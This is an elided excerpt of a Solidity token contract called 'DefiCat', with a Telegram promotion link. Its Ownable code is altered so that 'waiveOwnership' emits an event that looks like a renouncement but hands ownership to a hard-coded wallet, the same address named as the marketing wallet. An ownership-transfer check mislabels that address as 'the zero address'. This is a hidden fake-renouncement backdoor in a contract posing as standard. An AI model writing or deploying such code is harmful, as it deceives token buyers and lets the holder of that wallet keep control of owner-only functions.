...
//Telegram :https://t.me/+QTSqKqdrj103OTNk
...
contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = msgSender;
        emit OwnershipTransferred(address(0x1EdaA44187A8fAe822600FE680A0EFA584850899), msgSender);
    }
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x1EdaA44187A8fAe822600FE680A0EFA584850899));
        _owner = address(0x1EdaA44187A8fAe822600FE680A0EFA584850899);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0x1EdaA44187A8fAe822600FE680A0EFA584850899), "Ownable: new owner is not the zero address");
...
contract DefiCat is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x1EdaA44187A8fAe822600FE680A0EFA584850899); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xdB8B89d503C4cDe01a76Bc4dE8561a2D30A09392); // BuyBack Address
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount <= (3000 * 10**6 * 10**9), "Max wallet should be less or euqal to 3% totalSupply");
